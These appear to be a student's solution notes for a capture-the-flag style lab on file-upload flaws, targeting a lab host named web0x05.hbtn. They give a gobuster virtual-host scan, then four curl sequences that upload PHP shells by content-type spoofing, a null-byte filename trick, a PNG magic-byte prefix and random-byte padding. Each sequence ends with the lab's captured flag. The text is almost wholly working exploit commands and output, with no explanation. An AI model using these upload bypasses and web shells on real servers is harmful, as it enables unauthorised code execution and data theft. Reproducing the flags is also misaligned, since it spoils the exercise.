TO DO


0:
gobuster vhost -u http://web0x05.hbtn -w wds.txt --append-domain -t 50 2>/dev/null
test-s3.web0x05.hbtn Status: 200 [Size: 478]





1:
curl -s -X POST http://test-s3.web0x05.hbtn/api/task1/ \
  -F "file=@shell.php;type=application/octet-stream"
{"message":"'/static/upload/shell.php' uploaded successfully."}


curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
94f3390ef2068a67324f3a97e0e81bdc 





2:
curl -s -X POST http://test-s3.web0x05.hbtn/api/task2/ \
  -F "file=@shell.php;filename=shell.php%00.png"
{"message":"'/static/upload/shell.php' uploaded successfully."}

http://test-s3.web0x05.hbtn/static/upload/shell.php
8a22fa2b915a9110337ff5fd8f12779c




3:
printf '\x89PNG\r\n\x1a\n<?php readfile("FLAG_3.txt") ?>' > shell_magic.php


curl -s -X POST http://test-s3.web0x05.hbtn/api/task3/ \
  -F "file=@shell_magic.php;filename=shell.php%00.png"
{"message":"'/static/upload/shell.php' uploaded successfully."}

curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
5a29eaf40fe9024cb2f6065e501f232c 



4:
printf '\x89PNG\r\n\x1a\n<?php readfile("FLAG_4.txt") ?>' > shell4.php
# Pad to 90KB
dd if=/dev/urandom bs=1024 count=90 >> shell4.php
curl -si -X POST http://test-s3.web0x05.hbtn/api/task4/ \
  -F "file=@shell4.php;filename=shell.php%00.png"

90+0 records in
90+0 records out
92160 bytes (92 kB, 90 KiB) copied, 0.000536581 s, 172 MB/s
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Wed, 17 Jun 2026 09:46:59 GMT
Content-Type: application/json
Content-Length: 64
Connection: keep-alive
X-Debug-Mode: False

{"message":"'/static/upload/shell.php' uploaded successfully."}


curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
Go to http://test-s3.web0x05.hbtn/static/upload/shell.php -> and get flag: 2a0b8cd55ae584e2db7257730c0a6a31

